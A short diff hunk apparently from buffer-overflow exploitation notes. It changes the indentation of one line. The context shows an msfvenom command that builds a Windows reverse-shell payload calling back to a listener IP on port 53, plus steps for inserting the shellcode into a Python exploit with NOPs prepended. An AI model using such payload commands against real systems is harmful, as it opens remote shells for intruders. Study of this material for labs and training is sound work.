@@ -226,7 +226,7 @@ Generate a reverse shell payload using msfvenom, making sure to exclude the same
 
     msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.92 LPORT=53 EXITFUNC=thread -b "\x00\x0a\x0d" -f c    
     
-    copy C shellcode and insert into python script as payload = ("\xfc\xbb\xa1\..multiple lines..6\xa2\xeb\x0c")
+copy C shellcode and insert into python script as payload = ("\xfc\xbb\xa1\..multiple lines..6\xa2\xeb\x0c")
 
 Prepend NOPs
 ============
